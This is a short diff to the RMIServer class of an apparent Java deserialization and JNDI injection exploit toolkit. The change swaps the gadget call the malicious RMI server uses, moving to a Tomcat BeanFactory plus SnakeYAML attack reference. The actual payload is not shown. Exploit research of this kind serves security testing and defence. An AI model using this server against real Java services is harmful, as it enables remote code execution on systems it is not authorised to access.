@@ -3,7 +3,7 @@ package xyz.eki.marshalexp.tool;
 //Refer to https://github.com/TheKingOfDuck/JNDI-Injection-Exploit/blob/main/src/main/java/jndi/RMIRefServer.java
 
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
-import xyz.eki.marshalexp.gadget.jndi.GSnakeYaml;
+import xyz.eki.marshalexp.gadget.jndi.rmi.GTomcatBeanFactory;
 
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
@@ -42,6 +42,7 @@ import javassist.CtClass;
 import org.apache.naming.ResourceRef;
 import sun.rmi.server.UnicastServerRef;
 import sun.rmi.transport.TransportConstants;
+import xyz.eki.marshalexp.gadget.jndi.rmi.GTomcatBeanFactory;
 import xyz.eki.marshalexp.utils.ReflectUtils;
 
 
@@ -307,7 +308,7 @@ public class RMIServer implements Runnable {
 
 //            if (reference.startsWith("Bypass")){
                 System.out.println(getLocalTime() + " [RMISERVER]  >> Sending local classloading reference.");
-                ReflectUtils.setFieldValue(rw, "wrappee", GSnakeYaml.tomcat_snakeyaml());
+                ReflectUtils.setFieldValue(rw, "wrappee", GTomcatBeanFactory.AttackWithSnakeYaml());
 
 //            }else {
 //                System.out.println(
@@ -438,7 +439,7 @@ public class RMIServer implements Runnable {
         try {
             System.out.println(getLocalTime() + " [RMISERVER]  >> Opening JRMP listener on " + port);
             RMIServer c = new RMIServer(port, new URL("http://testlocal.com:8080/"));
-            c.setResourceRef(GSnakeYaml.tomcat_snakeyaml());
+            c.setResourceRef(GTomcatBeanFactory.AttackWithSnakeYaml());
             c.run();
         } catch (Exception e) {
             System.out.println(getLocalTime() + " [RMISERVER]  >> Listener error");
